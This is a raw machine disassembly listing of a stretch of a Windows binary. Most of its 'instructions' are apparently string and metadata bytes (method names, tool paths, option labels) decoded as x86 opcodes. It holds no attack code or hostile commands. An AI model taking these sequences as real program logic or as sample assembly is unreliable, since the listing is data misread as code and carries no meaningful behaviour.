  40b2de:	jb     0x40b353
  40b2e0:	gs inc ebp
  40b2e2:	js     0x40b347
  40b2e4:	gs jo  0x40b35b
  40b2e7:	imul   ebp,DWORD PTR [edi+0x6e],0x72615400
  40b2ee:	addr16 gs je 0x40b33b
  40b2f2:	outs   dx,BYTE PTR ds:[esi]
  40b2f3:	jbe    0x40b364
  40b2f5:	arpl   WORD PTR [ecx+0x74],sp
  40b2f8:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  40b2ff:	jo     0x40b375
  40b301:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  40b308:	pop    edi
  40b309:	dec    ecx
  40b30a:	outs   dx,BYTE PTR ds:[esi]
  40b30b:	outs   dx,BYTE PTR ds:[esi]
  40b30c:	gs jb  0x40b354
  40b30f:	js     0x40b374
  40b311:	gs jo  0x40b388
  40b314:	imul   ebp,DWORD PTR [edi+0x6e],0x72615000
  40b31b:	jae    0x40b382
  40b31d:	jb     0x40b364
  40b31f:	jb     0x40b393
  40b321:	outs   dx,DWORD PTR ds:[esi]
  40b322:	jb     0x40b367
  40b324:	outs   dx,DWORD PTR ds:[esi]
  40b325:	ins    BYTE PTR es:[edi],dx
  40b326:	ins    BYTE PTR es:[edi],dx
  40b327:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40b32c:	outs   dx,BYTE PTR ds:[esi]
  40b32d:	add    BYTE PTR [edi+0x65],ah
  40b330:	je     0x40b391
  40b332:	push   eax
  40b333:	popa   
  40b334:	jb     0x40b3a9
  40b336:	gs jb  0x40b37e
  40b339:	jb     0x40b3ad
  40b33b:	outs   dx,DWORD PTR ds:[esi]
  40b33c:	jb     0x40b3b1
  40b33e:	add    BYTE PTR [ebx+0x6f],al
  40b341:	ins    BYTE PTR es:[edi],dx
  40b342:	ins    BYTE PTR es:[edi],dx
  40b343:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40b348:	outs   dx,BYTE PTR ds:[esi]
  40b349:	inc    edx
  40b34a:	popa   
  40b34b:	jae    0x40b3b2
  40b34d:	add    BYTE PTR [ecx+0x70],al
  40b350:	jo     0x40b3be
  40b352:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40b359:	push   ebx
  40b35a:	push   0x6f647475
  40b35f:	ja     0x40b3cf
  40b361:	push   edx
  40b362:	gs popa 
  40b364:	jae    0x40b3d5
  40b366:	outs   dx,BYTE PTR ds:[esi]
  40b367:	add    BYTE PTR [edi+0x65],ah
  40b36a:	je     0x40b3cb
  40b36c:	push   edx
  40b36d:	gs popa 
  40b36f:	jae    0x40b3e0
  40b371:	outs   dx,BYTE PTR ds:[esi]
  40b372:	add    BYTE PTR [ebp+eiz*2+0x61],cl
  40b376:	jae    0x40b3dd
  40b378:	push   ebx
  40b379:	je     0x40b3dc
  40b37b:	je     0x40b3e2
  40b37d:	add    BYTE PTR [edi+0x65],ah
  40b380:	je     0x40b3e1
  40b382:	inc    ebx
  40b383:	jne    0x40b3f7
  40b385:	jb     0x40b3ec
  40b387:	outs   dx,BYTE PTR ds:[esi]
  40b388:	je     0x40b3dd
  40b38a:	je     0x40b3ed
  40b38c:	je     0x40b3f3
  40b38e:	add    BYTE PTR [esi+0x72],al
  40b391:	outs   dx,DWORD PTR ds:[esi]
  40b392:	ins    DWORD PTR es:[edi],dx
  40b393:	dec    ebp
  40b394:	imul   ebp,DWORD PTR [esi+0x75],0x736574
  40b39b:	jae    0x40b402
  40b39d:	je     0x40b3fe
  40b39f:	dec    ecx
  40b3a0:	outs   dx,BYTE PTR ds:[esi]
  40b3a1:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x61654c6c
  40b3a9:	jae    0x40b410
  40b3ab:	push   esp
  40b3ac:	imul   ebp,DWORD PTR [ebp+0x65],0x6f724600
  40b3b3:	ins    DWORD PTR es:[edi],dx
  40b3b4:	push   ebx
  40b3b5:	arpl   WORD PTR gs:[edi+0x6e],bp
  40b3b9:	fs jae 0x40b3bc
  40b3bc:	jae    0x40b423
  40b3be:	je     0x40b41f
  40b3c0:	push   edx
  40b3c1:	outs   dx,BYTE PTR gs:[esi]
  40b3c3:	gs ja  0x40b415
  40b3c6:	outs   dx,BYTE PTR ds:[esi]
  40b3c7:	inc    ebx
  40b3c8:	popa   
  40b3c9:	ins    BYTE PTR es:[edi],dx
  40b3ca:	ins    BYTE PTR es:[edi],dx
  40b3cb:	push   esp
  40b3cc:	imul   ebp,DWORD PTR [ebp+0x65],0x74657300
  40b3d3:	pop    edi
  40b3d4:	push   ebx
  40b3d5:	jo     0x40b446
  40b3d7:	outs   dx,BYTE PTR ds:[esi]
  40b3d8:	jae    0x40b449
  40b3da:	jb     0x40b44f
  40b3dc:	push   0x69547069
  40b3e1:	ins    DWORD PTR es:[edi],dx
  40b3e2:	outs   dx,DWORD PTR gs:[esi]
  40b3e4:	jne    0x40b45a
  40b3e6:	add    BYTE PTR [esi+edi*1],bh
  40b3e9:	arpl   WORD PTR [edi+0x5f],bx
  40b3ec:	inc    esp
  40b3ed:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  40b3f4:	ins    BYTE PTR es:[edi],dx
  40b3f5:	popa   
  40b3f6:	jae    0x40b46b
  40b3f8:	xor    DWORD PTR [eax],eax
  40b3fa:	cmp    al,0x3e
  40b3fc:	xor    al,0x5f
  40b3fe:	pop    edi
  40b3ff:	je     0x40b469
  40b401:	imul   esi,DWORD PTR [ebx+0x0],0x416e4f3c
  40b408:	jo     0x40b47a
  40b40a:	inc    esp
  40b40b:	outs   dx,DWORD PTR ds:[esi]
  40b40c:	ins    DWORD PTR es:[edi],dx
  40b40d:	popa   
  40b40e:	imul   ebp,DWORD PTR [esi+0x55],0x616f6c6e
  40b415:	fs gs fs bound ebx,QWORD PTR ds:[edi+0x5f]
  40b41c:	xor    BYTE PTR [eax],al
  40b41e:	cmp    al,0x3e
  40b420:	arpl   WORD PTR [edi+0x5f],bx
  40b423:	inc    esp
  40b424:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  40b42b:	ins    BYTE PTR es:[edi],dx
  40b42c:	popa   
  40b42d:	jae    0x40b4a2
  40b42f:	xor    al,0x0
  40b431:	cmp    al,0x4f
  40b433:	outs   dx,BYTE PTR ds:[esi]
  40b434:	inc    ecx
  40b435:	jo     0x40b4a7
  40b437:	inc    esp
  40b438:	outs   dx,DWORD PTR ds:[esi]
  40b439:	ins    DWORD PTR es:[edi],dx
  40b43a:	popa   
  40b43b:	imul   ebp,DWORD PTR [esi+0x53],0x64747568
  40b442:	outs   dx,DWORD PTR ds:[esi]
  40b443:	ja     0x40b4b3
  40b445:	bound  ebx,QWORD PTR ds:[edi+0x5f]
  40b449:	xor    eax,DWORD PTR [eax]
  40b44b:	cmp    al,0x4f
  40b44d:	outs   dx,BYTE PTR ds:[esi]
  40b44e:	inc    ecx
  40b44f:	jo     0x40b4c1
  40b451:	inc    esp
  40b452:	outs   dx,DWORD PTR ds:[esi]
  40b453:	ins    DWORD PTR es:[edi],dx
  40b454:	popa   
  40b455:	imul   ebp,DWORD PTR [esi+0x53],0x74726174
  40b45c:	gs fs bound ebx,QWORD PTR ds:[edi+0x5f]
  40b462:	add    BYTE PTR ss:[esi+edi*1],bh
  40b466:	arpl   WORD PTR [edi+0x5f],bx
  40b469:	inc    esp
  40b46a:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  40b471:	ins    BYTE PTR es:[edi],dx
  40b472:	popa   
  40b473:	jae    0x40b4e8
  40b475:	cmp    BYTE PTR [eax],al
  40b477:	cmp    al,0x52
  40b479:	gs jo  0x40b4eb
  40b47c:	jb     0x40b4f2
  40b47e:	inc    ebx
  40b47f:	outs   dx,DWORD PTR ds:[esi]
  40b480:	ins    DWORD PTR es:[edi],dx
  40b481:	jo     0x40b4ec
  40b483:	ins    BYTE PTR es:[edi],dx
  40b484:	popa   
  40b485:	je     0x40b4f0
  40b487:	outs   dx,DWORD PTR ds:[esi]
  40b488:	outs   dx,BYTE PTR ds:[esi]
  40b489:	inc    ebp
  40b48a:	jb     0x40b4fe
  40b48c:	outs   dx,DWORD PTR ds:[esi]
  40b48d:	jb     0x40b4cd
  40b48f:	bound  ebx,QWORD PTR [edi+0x5f]
  40b492:	aaa    
  40b493:	add    BYTE PTR [esi+edi*1],bh
  40b496:	arpl   WORD PTR [edi+0x5f],bx
  40b499:	inc    esp
  40b49a:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  40b4a1:	ins    BYTE PTR es:[edi],dx
  40b4a2:	popa   
  40b4a3:	jae    0x40b518
  40b4a5:	bound  eax,QWORD PTR [eax]
  40b4a7:	cmp    al,0x52
  40b4a9:	gs jo  0x40b51b
  40b4ac:	jb     0x40b522
  40b4ae:	inc    ebx
  40b4af:	outs   dx,DWORD PTR ds:[esi]
  40b4b0:	ins    DWORD PTR es:[edi],dx
  40b4b1:	jo     0x40b51c
  40b4b3:	ins    BYTE PTR es:[edi],dx
  40b4b4:	popa   
  40b4b5:	je     0x40b520
  40b4b7:	outs   dx,DWORD PTR ds:[esi]
  40b4b8:	outs   dx,BYTE PTR ds:[esi]
  40b4b9:	dec    ebp
  40b4ba:	gs jae 0x40b530
  40b4bd:	popa   
  40b4be:	gs bound ebx,QWORD PTR ds:[bx+0x5f]
  40b4c4:	popa   
  40b4c5:	add    BYTE PTR [esi+edi*1],bh
  40b4c8:	arpl   WORD PTR [edi+0x5f],bx
  40b4cb:	inc    esp
  40b4cc:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  40b4d3:	ins    BYTE PTR es:[edi],dx
  40b4d4:	popa   
  40b4d5:	jae    0x40b54a
  40b4d7:	add    BYTE PTR gs:[edi+eax*2],bh
  40b4db:	gs je  0x40b51f
  40b4de:	jae    0x40b553
  40b4e0:	gs ins DWORD PTR es:[edi],dx
  40b4e2:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  40b4e6:	popa   
  40b4e7:	je     0x40b551
  40b4e9:	inc    esi
  40b4ea:	outs   dx,DWORD PTR ds:[esi]
  40b4eb:	jb     0x40b53b
  40b4ed:	popa   
  40b4ee:	ins    DWORD PTR es:[edi],dx
  40b4ef:	gs bound ebx,QWORD PTR ds:[edi+0x5f]
  40b4f4:	add    BYTE PTR fs:[esi+edi*1],bh
  40b4f8:	arpl   WORD PTR [edi+0x5f],bx
  40b4fb:	inc    esp
  40b4fc:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  40b503:	ins    BYTE PTR es:[edi],dx
  40b504:	popa   
  40b505:	jae    0x40b57a
  40b507:	xor    DWORD PTR [ecx],esi
  40b509:	add    BYTE PTR [esi+0x69],dh
  40b50c:	jb     0x40b582
  40b50e:	jne    0x40b571
  40b510:	ins    BYTE PTR es:[edi],dx
  40b511:	push   eax
  40b512:	popa   
  40b513:	je     0x40b57d
  40b515:	dec    ecx
  40b516:	outs   dx,BYTE PTR ds:[esi]
  40b517:	outs   dx,WORD PTR ds:[esi]
  40b519:	add    BYTE PTR [edi+eax*2],bh
  40b51c:	gs je  0x40b575
  40b51f:	imul   esi,DWORD PTR [edx+0x74],0x506c6175
  40b526:	popa   
  40b527:	je     0x40b591
  40b529:	dec    ecx
  40b52a:	je     0x40b591
  40b52c:	ins    DWORD PTR es:[edi],dx
  40b52d:	dec    ecx
  40b52e:	outs   dx,BYTE PTR ds:[esi]
  40b52f:	outs   dx,WORD PTR ds:[esi]
  40b531:	bound  ebx,QWORD PTR ds:[edi+0x5f]
  40b535:	xor    DWORD PTR [eax],esi
  40b537:	add    BYTE PTR [esi+edi*1],bh
  40b53a:	arpl   WORD PTR [edi+0x5f],bx
  40b53d:	inc    esp
  40b53e:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  40b545:	ins    BYTE PTR es:[edi],dx
  40b546:	popa   
  40b547:	jae    0x40b5bc
  40b549:	xor    DWORD PTR [eax+eax*1],esi
  40b54c:	popa   
  40b54d:	bound  esi,QWORD PTR [ebx+0x6f]
  40b550:	ins    BYTE PTR es:[edi],dx
  40b551:	jne    0x40b5c7
  40b553:	gs push eax
  40b555:	popa   
  40b556:	je     0x40b5c0
  40b558:	add    BYTE PTR [eax*2+0x7275736e],bh
  40b55f:	gs inc ecx
  40b561:	bound  esi,QWORD PTR [ebx+0x6f]
  40b564:	ins    BYTE PTR es:[edi],dx
  40b565:	jne    0x40b5db
  40b567:	gs push eax
  40b569:	popa   
  40b56a:	je     0x40b5d4
  40b56c:	bound  ebx,QWORD PTR ds:[edi+0x5f]
  40b570:	xor    DWORD PTR [ebx],esi
  40b572:	add    BYTE PTR [esi+edi*1],bh
  40b575:	arpl   WORD PTR [edi+0x5f],bx
  40b578:	inc    esp
  40b579:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  40b580:	ins    BYTE PTR es:[edi],dx
  40b581:	popa   
  40b582:	jae    0x40b5f7
  40b584:	xor    DWORD PTR [edi],esi
  40b586:	add    BYTE PTR [ebx+0x68],ah
  40b589:	imul   ebp,DWORD PTR [esp+eiz*2+0x72],0x3c006e65
  40b591:	inc    edi
  40b592:	gs je  0x40b5d8
  40b595:	push   0x49646c69
  40b59a:	je     0x40b601
  40b59c:	ins    DWORD PTR es:[edi],dx
  40b59d:	jae    0x40b5dd
  40b59f:	bound  ebx,QWORD PTR [edi+0x5f]
  40b5a2:	xor    DWORD PTR [esi],esi
  40b5a4:	add    BYTE PTR [ecx+0x6e],cl
  40b5a7:	jbe    0x40b618
  40b5a9:	imul   esp,DWORD PTR [ebp+0x0],0x52
  40b5ad:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69567265
  40b5b6:	jb     0x40b62c
  40b5b8:	jne    0x40b61b
  40b5ba:	ins    BYTE PTR es:[edi],dx
  40b5bb:	push   eax
  40b5bc:	popa   
  40b5bd:	je     0x40b627
  40b5bf:	push   eax
  40b5c0:	jb     0x40b631
  40b5c2:	jbe    0x40b62d
  40b5c4:	fs gs jb 0x40b5c8
  40b5c8:	inc    ecx
  40b5c9:	jo     0x40b63b
  40b5cb:	inc    esp
  40b5cc:	outs   dx,DWORD PTR ds:[esi]
  40b5cd:	ins    DWORD PTR es:[edi],dx
  40b5ce:	popa   
  40b5cf:	imul   ebp,DWORD PTR [esi+0x0],0x5f746567
  40b5d6:	inc    ebx
  40b5d7:	jne    0x40b64b
  40b5d9:	jb     0x40b640
  40b5db:	outs   dx,BYTE PTR ds:[esi]
  40b5dc:	je     0x40b622
  40b5de:	outs   dx,DWORD PTR ds:[esi]
  40b5df:	ins    DWORD PTR es:[edi],dx
  40b5e0:	popa   
  40b5e1:	imul   ebp,DWORD PTR [esi+0x0],0x6f736552
  40b5e8:	ins    BYTE PTR es:[edi],dx
  40b5e9:	jbe    0x40b650
  40b5eb:	inc    ebp
  40b5ec:	jbe    0x40b653
  40b5ee:	outs   dx,BYTE PTR ds:[esi]
  40b5ef:	je     0x40b639
  40b5f1:	popa   
  40b5f2:	outs   dx,BYTE PTR ds:[esi]
  40b5f3:	fs ins BYTE PTR es:[edi],dx
  40b5f5:	gs jb  0x40b5f8
  40b5f8:	popa   
  40b5f9:	fs fs pop edi
  40b5fc:	inc    ecx
  40b5fd:	jae    0x40b672
  40b5ff:	gs ins DWORD PTR es:[edi],dx
  40b601:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  40b605:	gs jae 0x40b677
  40b608:	ins    BYTE PTR es:[edi],dx
  40b609:	jbe    0x40b670
  40b60b:	add    BYTE PTR [eax+0x74],cl
  40b60e:	je     0x40b680
  40b610:	push   edx
  40b611:	jne    0x40b681
  40b613:	je     0x40b67e
  40b615:	ins    DWORD PTR es:[edi],dx
  40b616:	add    BYTE PTR gs:[edi+0x65],ah
  40b61a:	je     0x40b67b
  40b61c:	inc    ebx
  40b61d:	outs   dx,DWORD PTR ds:[esi]
  40b61e:	fs gs outs dx,BYTE PTR gs:[si]
  40b623:	inc    esp
  40b624:	imul   esi,DWORD PTR [edx+0x0],0x61657243
  40b62b:	je     0x40b692
  40b62d:	inc    esp
  40b62e:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40b635:	jns    0x40b637
  40b637:	outs   dx,DWORD PTR ds:[esi]
  40b638:	jo     0x40b699
  40b63a:	inc    edi
  40b63b:	jb     0x40b6a2
  40b63d:	popa   
  40b63e:	je     0x40b6a5
  40b640:	jb     0x40b696
  40b642:	push   0x43006e61
  40b647:	outs   dx,DWORD PTR ds:[esi]
  40b648:	jo     0x40b6c3
  40b64a:	add    BYTE PTR [edi+0x70],ch
  40b64d:	pop    edi
  40b64e:	inc    ebp
  40b64f:	jno    0x40b6c6
  40b651:	popa   
  40b652:	ins    BYTE PTR es:[edi],dx
  40b653:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x41746547
  40b65b:	jae    0x40b6d0
  40b65d:	gs ins DWORD PTR es:[edi],dx
  40b65f:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40b663:	dec    ecx
  40b664:	jae    0x40b6af
  40b666:	outs   dx,BYTE PTR ds:[esi]
  40b667:	jae    0x40b6dd
  40b669:	popa   
  40b66a:	outs   dx,BYTE PTR ds:[esi]
  40b66b:	arpl   WORD PTR [ebp+0x4f],sp
  40b66e:	push   sp
  40b670:	jns    0x40b6e2
  40b672:	add    BYTE PTR gs:[ebp+0x69],cl
  40b676:	outs   dx,BYTE PTR ds:[esi]
  40b677:	push   esi
  40b678:	popa   
  40b679:	ins    BYTE PTR es:[edi],dx
  40b67a:	jne    0x40b6e1
  40b67c:	add    BYTE PTR [edi+0x65],al
  40b67f:	je     0x40b6cd
  40b681:	popa   
  40b682:	jae    0x40b6f8
  40b684:	push   edi
  40b685:	jb     0x40b6f0
  40b687:	je     0x40b6ee
  40b689:	push   esp
  40b68a:	imul   ebp,DWORD PTR [ebp+0x65],0x74656700
  40b691:	pop    edi
  40b692:	dec    ecx
  40b693:	jae    0x40b6d9
  40b695:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40b69c:	jns    0x40b69e
  40b69e:	inc    esi
  40b69f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x61657274
  40b6a7:	ins    DWORD PTR es:[edi],dx
  40b6a8:	add    BYTE PTR [edi+0x70],cl
  40b6ab:	outs   dx,BYTE PTR gs:[esi]
  40b6ad:	push   edx
  40b6ae:	gs popa 
  40b6b0:	add    BYTE PTR fs:[esi+0x69],dl
  40b6b4:	jb     0x40b72a
  40b6b6:	jne    0x40b719
  40b6b8:	ins    BYTE PTR es:[edi],dx
  40b6b9:	inc    esi
  40b6ba:	imul   ebp,DWORD PTR [ebp+eiz*2+0x42],0x657361
  40b6c2:	add    BYTE PTR [eax],al
  40b6c4:	add    BYTE PTR ds:0x65002f,bl
  40b6ca:	outs   dx,BYTE PTR ds:[esi]
  40b6cb:	add    BYTE PTR [eax+eax*1+0x70],ah
  40b6cf:	add    BYTE PTR [edi+0x0],ch
  40b6d2:	imul   eax,DWORD PTR [eax],0x74006e
  40b6d8:	inc    edi
  40b6d9:	add    BYTE PTR [ebp+0x0],dh
  40b6dc:	imul   eax,DWORD PTR [eax],0x3a0064
  40b6e2:	add    BYTE PTR [edi],cl
  40b6e4:	das    
  40b6e5:	add    BYTE PTR [esi+0x0],dh
  40b6e8:	jae    0x40b6ea
  40b6ea:	push   eax
  40b6eb:	add    BYTE PTR [ecx+0x0],ch
  40b6ee:	add    BYTE PTR fs:[edx],bh
  40b6f1:	add    BYTE PTR [eax],al
  40b6f3:	daa    
  40b6f4:	das    
  40b6f5:	add    BYTE PTR [ecx+0x0],ah
  40b6f8:	jne    0x40b6fa
  40b6fa:	je     0x40b6fc
  40b6fc:	push   0x72006f00
  40b701:	add    BYTE PTR [ecx+0x0],ch
  40b704:	jae    0x40b706
  40b706:	add    BYTE PTR gs:[eax+eax*1+0x55],ah
  40b70b:	add    BYTE PTR [ebx+0x0],dh
  40b70e:	add    BYTE PTR gs:[edx+0x0],dh
  40b712:	push   ebx
  40b713:	add    BYTE PTR [ecx+0x0],ch
  40b716:	add    BYTE PTR fs:[edx],bh
  40b719:	add    BYTE PTR [eax],al
  40b71b:	and    DWORD PTR [edi],ebp
  40b71d:	add    BYTE PTR [edx+0x0],dh
  40b720:	add    BYTE PTR gs:[ecx+0x0],ah
  40b724:	add    BYTE PTR fs:[ecx+0x0],bh
  40b728:	inc    ebp
  40b729:	add    BYTE PTR [esi+0x0],dh
  40b72c:	add    BYTE PTR gs:[esi+0x0],ch
  40b730:	je     0x40b732
  40b732:	dec    esi
  40b733:	add    BYTE PTR [ecx+0x0],ah
  40b736:	ins    DWORD PTR es:[edi],dx
  40b737:	add    BYTE PTR [ebp+0x0],ah
  40b73a:	cmp    al,BYTE PTR [eax]
  40b73c:	add    BYTE PTR ds:0x63002f,dl
  40b742:	ins    BYTE PTR es:[edi],dx
  40b743:	add    BYTE PTR [ecx+0x0],ch
  40b746:	add    BYTE PTR gs:[esi+0x0],ch
  40b74a:	je     0x40b74c
  40b74c:	dec    ecx
  40b74d:	add    BYTE PTR [eax+eax*1+0x3a],ah
  40b751:	add    BYTE PTR [eax],al
  40b753:	and    DWORD PTR [edi],ebp
  40b755:	add    BYTE PTR [ecx+0x0],ah
  40b758:	je     0x40b75a
  40b75a:	je     0x40b75c
  40b75c:	popa   
  40b75d:	add    BYTE PTR [ebx+0x0],ah
  40b760:	push   0x65004400
  40b765:	add    BYTE PTR [edx+0x0],ah
  40b768:	jne    0x40b76a
  40b76a:	add    BYTE PTR [bx+0x0],ah
  40b76e:	add    BYTE PTR gs:[edx+0x0],dh
  40b772:	cmp    al,BYTE PTR [eax]
  40b774:	add    BYTE PTR [ebx],bl
  40b776:	das    
  40b777:	add    BYTE PTR [ebp+0x0],ah
  40b77a:	outs   dx,BYTE PTR ds:[esi]
  40b77b:	add    BYTE PTR [ecx+0x0],ah
  40b77e:	bound  eax,QWORD PTR [eax]
  40b780:	ins    BYTE PTR es:[edi],dx
  40b781:	add    BYTE PTR [ebp+0x0],ah
  40b784:	push   esp
  40b785:	add    BYTE PTR [edx+0x0],dh
  40b788:	popa   
  40b789:	add    BYTE PTR [ebx+0x0],ah
  40b78c:	add    BYTE PTR gs:[edx],bh
  40b78f:	add    BYTE PTR [eax],al
  40b791:	sub    ebp,DWORD PTR [esi+0x0]
  40b794:	add    BYTE PTR gs:[eax+eax*1+0x2e],dh
  40b799:	add    BYTE PTR [eax+0x0],dh
  40b79c:	imul   eax,DWORD PTR [eax],0x650070
  40b7a2:	cmp    al,BYTE PTR [eax]
  40b7a4:	das    
  40b7a5:	add    BYTE PTR [edi],ch
  40b7a7:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40b7ab:	add    BYTE PTR [ebx+0x0],ah
  40b7ae:	popa   
  40b7af:	add    BYTE PTR [eax+eax*1+0x68],ch
  40b7b3:	add    BYTE PTR [edi+0x0],ch
  40b7b6:	jae    0x40b7b8
  40b7b8:	je     0x40b7ba
  40b7ba:	das    
  40b7bb:	add    BYTE PTR [eax],al
  40b7bd:	pop    ebp
  40b7be:	push   ebx
  40b7bf:	add    BYTE PTR [edi+0x0],ch
  40b7c2:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  40b7c7:	add    BYTE PTR [ecx+0x0],ah
  40b7ca:	jb     0x40b7cc
  40b7cc:	add    BYTE PTR gs:[eax+eax*1+0x6d],bl
  40b7d1:	add    BYTE PTR [ecx+0x0],ch
  40b7d4:	arpl   WORD PTR [eax],ax
  40b7d6:	jb     0x40b7d8
  40b7d8:	outs   dx,DWORD PTR ds:[esi]
  40b7d9:	add    BYTE PTR [ebx+0x0],dh
  40b7dc:	outs   dx,DWORD PTR ds:[esi]
  40b7dd:	add    BYTE PTR [esi+0x0],ah
  40b7e0:	je     0x40b7e2
  40b7e2:	pop    esp
  40b7e3:	add    BYTE PTR [esi+0x0],dh
  40b7e6:	imul   eax,DWORD PTR [eax],0x750073
  40b7ec:	popa   
  40b7ed:	add    BYTE PTR [eax+eax*1+0x73],ch
  40b7f1:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b7f5:	add    BYTE PTR [eax+eax*1+0x69],ah
  40b7f9:	add    BYTE PTR [edi+0x0],ch
  40b7fc:	pop    esp
  40b7fd:	add    BYTE PTR [edi+0x0],dl
  40b800:	add    BYTE PTR gs:[edx+0x0],ah
  40b804:	dec    eax
  40b805:	add    BYTE PTR [edi+0x0],ch
  40b808:	jae    0x40b80a
  40b80a:	je     0x40b80c
  40b80c:	push   eax
  40b80d:	add    BYTE PTR [edx+0x0],dh
  40b810:	outs   dx,DWORD PTR ds:[esi]
  40b811:	add    BYTE PTR [ebx+0x0],ah
  40b814:	add    BYTE PTR gs:[ebx+0x0],dh
  40b818:	jae    0x40b81a
  40b81a:	add    BYTE PTR [ecx],ch
  40b81c:	inc    esp
  40b81d:	add    BYTE PTR [ebp+0x0],ah
  40b820:	ins    BYTE PTR es:[edi],dx
  40b821:	add    BYTE PTR [ecx+0x0],ah
  40b824:	jns    0x40b826
  40b826:	push   eax
  40b827:	add    BYTE PTR [edx+0x0],dh
  40b82a:	outs   dx,DWORD PTR ds:[esi]
  40b82b:	add    BYTE PTR [ebx+0x0],ah
  40b82e:	add    BYTE PTR gs:[ebx+0x0],dh
  40b832:	jae    0x40b834
  40b834:	push   ebx
  40b835:	add    BYTE PTR [eax+0x0],ch
  40b838:	jne    0x40b83a
  40b83a:	je     0x40b83c
  40b83c:	add    BYTE PTR fs:[edi+0x0],ch
  40b840:	ja     0x40b842
  40b842:	outs   dx,BYTE PTR ds:[esi]
  40b843:	add    BYTE PTR [eax],al
  40b845:	daa    
  40b846:	inc    ebx
  40b847:	add    BYTE PTR [edx+0x0],al
  40b84a:	dec    ebp
  40b84b:	add    BYTE PTR [edi+0x0],cl
  40b84e:	jne    0x40b850
  40b850:	je     0x40b852
  40b852:	dec    edi
  40b853:	add    BYTE PTR [esi+0x0],ah
  40b856:	push   eax
  40b857:	add    BYTE PTR [edx+0x0],dh
  40b85a:	outs   dx,DWORD PTR ds:[esi]
  40b85b:	add    BYTE PTR [ebx+0x0],ah
  40b85e:	push   ebx
  40b85f:	add    BYTE PTR [ebp+0x0],ah
  40b862:	jb     0x40b864
  40b864:	jbe    0x40b866
  40b866:	imul   eax,DWORD PTR [eax],0x650063
  40b86c:	add    BYTE PTR [edi],bl
  40b86e:	inc    ebp
  40b86f:	add    BYTE PTR [eax+0x0],bh
  40b872:	add    BYTE PTR gs:[ebx+0x0],ah
  40b876:	jne    0x40b878
  40b878:	je     0x40b87a
  40b87a:	add    BYTE PTR gs:[edi+0x0],dl
  40b87e:	outs   dx,DWORD PTR ds:[esi]
  40b87f:	add    BYTE PTR [edx+0x0],dh
  40b882:	imul   eax,DWORD PTR [eax],0x49
  40b885:	add    BYTE PTR [eax+eax*1+0x65],dh
  40b889:	add    BYTE PTR [ebp+0x0],ch
  40b88c:	add    BYTE PTR ds:0x750043,bl
  40b892:	jb     0x40b894
  40b894:	jb     0x40b896
  40b896:	add    BYTE PTR gs:[esi+0x0],ch
  40b89a:	je     0x40b89c
  40b89c:	inc    ebx
  40b89d:	add    BYTE PTR [ebp+0x0],dh
  40b8a0:	ins    BYTE PTR es:[edi],dx
  40b8a1:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b8a5:	add    BYTE PTR [edx+0x0],dh
  40b8a8:	add    BYTE PTR gs:[eax],al
  40b8ab:	sbb    BYTE PTR [ecx+0x740068],0x74
  40b8b2:	add    BYTE PTR [eax+0x0],dh
  40b8b5:	cmp    al,BYTE PTR [eax]
  40b8b7:	das    
  40b8b8:	add    BYTE PTR [edi],ch
  40b8ba:	add    BYTE PTR [ebx+0x0],dh
  40b8bd:	arpl   WORD PTR [eax],ax
  40b8bf:	push   0x6d006500
  40b8c4:	add    BYTE PTR [ecx+0x0],ah
  40b8c7:	jae    0x40b8c9
  40b8c9:	add    BYTE PTR cs:[ebp+0x0],ch
  40b8cd:	imul   eax,DWORD PTR [eax],0x720063
  40b8d3:	outs   dx,DWORD PTR ds:[esi]
  40b8d4:	add    BYTE PTR [ebx+0x0],dh
  40b8d7:	outs   dx,DWORD PTR ds:[esi]
  40b8d8:	add    BYTE PTR [esi+0x0],ah
  40b8db:	je     0x40b8dd
  40b8dd:	add    BYTE PTR cs:[ebx+0x0],ah
  40b8e1:	outs   dx,DWORD PTR ds:[esi]
  40b8e2:	add    BYTE PTR [ebp+0x0],ch
  40b8e5:	das    
  40b8e6:	add    BYTE PTR [esi+0x0],dl
  40b8e9:	imul   eax,DWORD PTR [eax],0x750073
  40b8ef:	popa   
  40b8f0:	add    BYTE PTR [eax+eax*1+0x53],ch
  40b8f4:	add    BYTE PTR [eax+eax*1+0x75],dh
  40b8f8:	add    BYTE PTR [eax+eax*1+0x69],ah
  40b8fc:	add    BYTE PTR [edi+0x0],ch
  40b8ff:	das    
  40b900:	add    BYTE PTR [edx],dh
  40b902:	add    BYTE PTR [eax],dh
  40b904:	add    BYTE PTR [ecx],dh
  40b906:	add    BYTE PTR [ecx],dh
  40b908:	add    BYTE PTR [edi],ch
  40b90a:	add    BYTE PTR [edi+0x0],dl
  40b90d:	add    BYTE PTR gs:[edx+0x0],ah
  40b911:	push   eax
  40b912:	add    BYTE PTR [eax+eax*1+0x61],ch
  40b916:	add    BYTE PTR [eax+eax*1+0x66],dh
  40b91a:	add    BYTE PTR [edi+0x0],ch
  40b91d:	jb     0x40b91f
  40b91f:	ins    DWORD PTR es:[edi],dx
  40b920:	add    BYTE PTR [eax+eax*1+0x6f],dl
  40b924:	add    BYTE PTR [edi+0x0],ch
  40b927:	ins    BYTE PTR es:[edi],dx
  40b928:	add    BYTE PTR [ebx+0x0],dh
  40b92b:	das    
